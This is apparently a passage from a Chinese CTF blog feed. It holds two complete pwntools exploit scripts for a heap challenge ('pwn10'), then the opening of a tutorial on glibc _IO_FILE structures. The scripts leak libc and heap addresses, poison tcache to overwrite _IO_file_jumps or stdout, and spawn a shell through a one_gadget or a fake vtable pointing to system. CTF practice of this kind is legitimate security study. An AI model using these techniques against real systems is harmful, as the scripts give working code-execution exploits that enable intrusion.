修改_IO_file_jumps中的_IO_new_file_overflow</h3><p>注意：只能劫持_IO_file_jumps，不能直接劫持修改_IO_new_file_overflow</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./pwn10&#x27;</span><br>url = <span class="hljs-string">&#x27;node4.anna.nssctf.cn:28174&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * main</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>menu = <span class="hljs-string">&#x27;Choice: &#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, size, content</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>, content)<br>    <br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(i)<br><br>show(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># main_arena = u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8, b&#x27;\x00&#x27;)) - 96</span><br><span class="hljs-comment"># [+] ;40mmain_arena ---&gt; 0xa20 </span><br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>main_arena = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>lss(<span class="hljs-string">&quot;main_arena&quot;</span>)<br><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>key = u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = key &lt;&lt; <span class="hljs-number">12</span><br>lss(<span class="hljs-string">&quot;heap_base&quot;</span>)<br><br><br>libc_base = main_arena - libc.sym[<span class="hljs-string">&#x27;main_arena&#x27;</span>]<br>_IO_file_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br><br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># for i in range(5):</span><br><span class="hljs-comment">#     add() #9 - 13</span><br><br>p1 = p64(key ^ _IO_file_jumps)<br>edit(<span class="hljs-number">6</span>, <span class="hljs-number">0x10</span>, p1)<br><br>add() <span class="hljs-comment">#14 #9</span><br>add() <span class="hljs-comment">#15 #10</span><br><br>one = [<span class="hljs-number">0xda861</span>, <span class="hljs-number">0xda864</span>, <span class="hljs-number">0xda867</span>]<br>one_gadget = one[<span class="hljs-number">1</span>] + libc_base<br>edit(<span class="hljs-number">10</span>, <span class="hljs-number">0x20</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(one_gadget))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="方法二-——-伪造io结构体"><a href="#方法二-——-伪造io结构体" class="headerlink" title="方法二 —— 伪造io结构体"></a>方法二 —— 伪造io结构体</h3><p>劫持_IO_new_file_xsputn这个函数。当然了修改_IO_new_file_overflow这个也是可以的，就是利用puts这个函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./pwn10&#x27;</span><br>url = <span class="hljs-string">&#x27;node4.anna.nssctf.cn:28174&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * main</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>menu = <span class="hljs-string">&#x27;Choice: &#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, size, content</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>, content)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) :<br>    add()  <span class="hljs-comment">#0 - 8</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>) :<br>    delete(i) <br><br>show(<span class="hljs-number">7</span>)<br>p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<br><br>main_arena = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>libc_base = main_arena - <span class="hljs-number">0x1f2c60</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span><br>lss(<span class="hljs-string">&#x27;main_arena&#x27;</span>)<br>lss(<span class="hljs-string">&quot;libc_base&quot;</span>)<br>lss(<span class="hljs-string">&quot;heap_base&quot;</span>)<br><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>stdout = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>IO_file_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br><br>key = heap_base &gt;&gt; <span class="hljs-number">12</span><br>lss(<span class="hljs-string">&#x27;key&#x27;</span>)<br><br>target = key ^ IO_file_jumps<br>edit(<span class="hljs-number">6</span> , <span class="hljs-number">0x8</span> , p64(target))<br><br>add() <span class="hljs-comment">#9</span><br>add() <span class="hljs-comment">#10</span><br><br>fake = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>fake += p64(libc_base + <span class="hljs-number">0x83d80</span>) + p64(libc_base + <span class="hljs-number">0x84750</span>)<br>fake += p64(libc_base + <span class="hljs-number">0x84440</span>) + p64(libc_base + <span class="hljs-number">0x85520</span>)<br>fake += p64(libc_base + <span class="hljs-number">0x86600</span>) + p64(system_addr)<br><br><br><br>delete(<span class="hljs-number">9</span>)<br>target = key ^ stdout<br>edit(<span class="hljs-number">9</span> , <span class="hljs-number">0x8</span> , p64(target))<br>add() <span class="hljs-comment">#11</span><br>add() <span class="hljs-comment">#12</span><br>edit(<span class="hljs-number">12</span> , <span class="hljs-number">0x8</span> , <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br><br>pause()<br>p.sendlineafter(menu , <span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;10&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(fake)))<br>p.sendline(fake)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>IO_FILE结构体认识和利用</title>
    <link href="/2024/12/07/IO%E7%B3%BB%E5%88%97%E4%B9%8B%E8%AE%A4%E8%AF%86IO_FILE/"/>
    <url>/2024/12/07/IO%E7%B3%BB%E5%88%97%E4%B9%8B%E8%AE%A4%E8%AF%86IO_FILE/</url>
    
    <content type="html"><![CDATA[<h1 id="IO-FILE结构体和IO函数认识"><a href="#IO-FILE结构体和IO函数认识" class="headerlink" title="IO_FILE结构体和IO函数认识"></a>IO_FILE结构体和IO函数认识</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在学习完setcontext打ORW之后，突然有点顿悟的感觉，关于结构体的相关利用也不那么畏惧了。今天就趁热打铁学习一下一个大专题<strong>IO_FILE</strong></p><h2 id="IO-FILE结构体认识"><a href="#IO-FILE结构体认识" class="headerlink" title="IO_FILE结构体认识"></a>IO_FILE结构体认识</h2><p>首先来看一下源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//相关定义在libcio\libio.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;<span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;<span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;<span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;<span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base;<span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;<span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;<span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;<span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;<span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。</p><p>但是事实上_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//相关定义在libio\libioP.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>而vtable 是 IO_jump_t 类型的指针，IO_jump_t 中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><p>在标准 I&#x2F;O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span>;</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stdin_</span>;</span><br><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stdout_</span>;</span><br><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stderr_</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _LIBC</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_stdin ((_IO_FILE*)(&amp;_IO_2_1_stdin_))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_stdout ((_IO_FILE*)(&amp;_IO_2_1_stdout_))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_stderr ((_IO_FILE*)(&amp;_IO_2_1_stderr_))</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">extern</span> _IO_FILE *_IO_stdin attribute_hidden;<br><span class="hljs-keyword">extern</span> _IO_FILE *_IO_stdout attribute_hidden;<br><span class="hljs-keyword">extern</span> _IO_FILE *_IO_stderr attribute_hidden;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p><strong><code>struct _IO_FILE_plus</code></strong>:</p><ul><li>定义了一个结构体，但此处是前向声明，具体实现不在当前代码中。</li><li><code>_IO_FILE_plus</code> 是 glibc 中扩展 <code>struct _IO_FILE</code> 的结构体，用于管理标准 I&#x2F;O 流。</li></ul><p><strong><code>_IO_2_1_stdin_</code>、<code>_IO_2_1_stdout_</code>、<code>_IO_2_1_stderr_</code></strong>:</p><ul><li>它们是 <code>struct _IO_FILE_plus</code> 类型的全局变量，分别代表标准输入（stdin）、标准输出（stdout）和标准错误（stderr）。</li></ul><p>我们可以在 libc.so 中找到 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412071444828.png" 